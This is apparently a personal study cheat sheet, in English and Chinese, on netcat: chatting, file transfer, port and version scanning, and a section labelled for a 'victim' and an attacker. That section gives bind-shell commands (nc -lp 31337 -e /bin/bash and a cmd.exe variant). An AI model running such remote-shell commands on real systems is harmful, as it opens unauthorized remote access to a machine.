
Use TCP default

### chat
nc -v -lp 22 localhost

### file transfer
server:
    nc -v -lp 31337 localhost < a.txt
    cat a.txt | nc -lp 1337
client:
    nc -v  localhost 31337 > a.txt


sender:
    tar -cf - Pictures | nc -lp 1337
receiver:
    nc 10.1.1.1 1337 | tar -xf -

### port scan
nc -v localhost -z 1-1000
    -z : without sending any data to them, // is it really ? use wireshark to check
        意思就是仅仅是去 ping 去探测目标是否开启指定端口，不进行任何的交互。
        z 参数默认扫描的是 tcp 类型，如果需要扫描 udp，则需要使用一个新参数 u???
nc -v localhost 1-1000
    没有-z的话，每一个结果出来后都需要Ctrl + c ，进行下一个目标端口的开始
nc -v localhost 80

### version scan
nc -v localhost 22  //功能简单，目标明确

同 nmap -v -sV localhost -p 22, 这个会给出OS的类型，信息更多些

### remote shell
victim
    windows:
        nc -Lp 31337 -vv -e cmd.exe  //hack5 说这个-L 会让服务端持续监听，但是 却提示Invalid -L
    Linux:
        nc -lp 31337 -vv -e /bin/bash   //linux上是-l 

攻击端
    nc localhost 31337
上面的通讯是未加密的
cryptcat 是加密版本，但是没有-e选项

https://blog.csdn.net/fageweiketang/article/details/82833193    搜索""加密传输文件""

ncat 中很多参数和 nc 一样，其中可以通过 --alow 参数来指定允许连接的机器，通过 --ssl 进行数据的加密


### 
-u : udp
-n : do not do any DNS





https://www.bilibili.com/video/av36431293/?p=10









